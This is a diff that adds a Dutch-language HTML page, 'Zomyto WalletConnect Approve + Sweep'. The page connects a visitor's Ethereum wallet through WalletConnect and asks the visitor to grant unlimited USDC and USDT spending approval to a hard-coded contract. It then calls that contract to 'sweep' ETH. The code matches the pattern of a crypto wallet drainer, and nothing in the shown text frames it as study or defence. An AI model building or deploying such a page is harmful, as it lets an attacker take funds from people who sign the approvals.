@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html lang="nl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Zomyto WalletConnect Approve + Sweep</title>
+<script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+<script src="https://unpkg.com/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>
+
+<style>
+body { background:#121212; color:white; font-family:Arial; text-align:center; padding-top:50px; }
+button { background:#1e88e5; color:white; padding:15px 25px; border:none; border-radius:8px; font-size:1.2rem; cursor:pointer; margin-top:20px;}
+button:disabled { background:grey; }
+img { margin-top:20px; }
+</style>
+</head>
+<body>
+
+<h1>Zomyto WalletConnect Approve + Sweep</h1>
+<p>Scan de QR met je wallet of klik Connect</p>
+
+<img src="https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=https://scan.walletconnect.com/?clientMeta.name=Zomyto&projectId=0e7d96df89f873ddfb0b4381e13c883c" alt="Scan QR">
+
+<br>
+<button id="connectBtn">🔗 Connect Wallet</button>
+<button id="approveBtn" disabled>✅ Approve USDC + USDT</button>
+<button id="sweepBtn" disabled>💰 Sweep ETH</button>
+
+<script>
+let provider, signer;
+
+// ERC20 tokens
+const tokens = [
+  { name: "USDC", address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48" },
+  { name: "USDT", address: "0xdAC17F958D2ee523a2206206994597C13D831ec7" }
+];
+
+// AutoExecute contract adres
+const autoExecute = "0x2F6DAC950c8e2433734Fe50bC72F18E2d2dD8f2A"; // vervang indien nodig
+
+// ERC20 approve ABI
+const tokenABI = ["function approve(address spender, uint256 amount) public returns (bool)"];
+// AutoExecute ABI
+const autoExecuteABI = ["function execute() external"];
+
+// RPC met jouw Infura Project ID
+const rpc = {
+  1: "https://mainnet.infura.io/v3/1506833c04954b058aad864f0d9ce1a2"
+};
+
+// Connect WalletConnect v2
+document.getElementById("connectBtn").onclick = async () => {
+  const wcProvider = new WalletConnectProvider.default({
+    projectId: "0e7d96df89f873ddfb0b4381e13c883c",
+    chains: [1],
+    rpc
+  });
+
+  try {
+    await wcProvider.enable();
+    provider = new ethers.providers.Web3Provider(wcProvider);
+    signer = provider.getSigner();
+
+    document.getElementById("approveBtn").disabled = false;
+    document.getElementById("sweepBtn").disabled = false;
+
+    alert("Wallet connected!");
+  } catch (err) {
+    console.error(err);
+    alert("Fout bij verbinden: " + err.message);
+  }
+};
+
+// Approve USDC + USDT
+document.getElementById("approveBtn").onclick = async () => {
+  try {
+    for (let t of tokens) {
+      const token = new ethers.Contract(t.address, tokenABI, signer);
+      const tx = await token.approve(autoExecute, ethers.constants.MaxUint256);
+      await tx.wait();
+      console.log("✅ Approved:", t.name);
+    }
+    alert("USDC + USDT succesvol goedgekeurd!");
+  } catch (err) {
+    console.error(err);
+    alert("Fout bij approve: " + err.message);
+  }
+};
+
+// Sweep ETH via AutoExecute contract
+document.getElementById("sweepBtn").onclick = async () => {
+  try {
+    const contract = new ethers.Contract(autoExecute, autoExecuteABI, signer);
+    const tx = await contract.execute();
+    await tx.wait();
+    alert("ETH succesvol geswept!");
+  } catch (err) {
+    console.error(err);
+    alert("Fout bij sweep: " + err.message);
+  }
+};
+</script>
+
+</body>
+</html>
